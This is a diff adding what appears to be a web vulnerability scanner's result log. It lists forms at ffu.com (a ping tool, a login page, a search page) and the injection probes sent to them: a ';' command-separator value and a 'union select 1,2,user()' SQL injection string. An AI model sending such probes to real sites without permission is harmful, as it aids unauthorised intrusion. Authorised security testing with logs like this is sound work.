@@ -1,0 +1,20 @@
+url: http://www.ffu.com/ping_domain.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'input', 'value': ';'}, {'type': 'submit', 'name': 'submit'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/user_login.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': ';'}, {'type': 'password', 'name': 'password'}, {'type': 'checkbox', 'name': 'remember'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/search.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': '%20union%20select%201,2,user()--'}]}
+payload: < %20union%20select%201,2,user()-- >
+----------------------------
+url: http://www.ffu.com/ping_domain.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'input', 'value': ';'}, {'type': 'submit', 'name': 'submit'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/user_login.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': ';'}, {'type': 'password', 'name': 'password'}, {'type': 'checkbox', 'name': 'remember'}]}
+payload: < ; >
+----------------------------
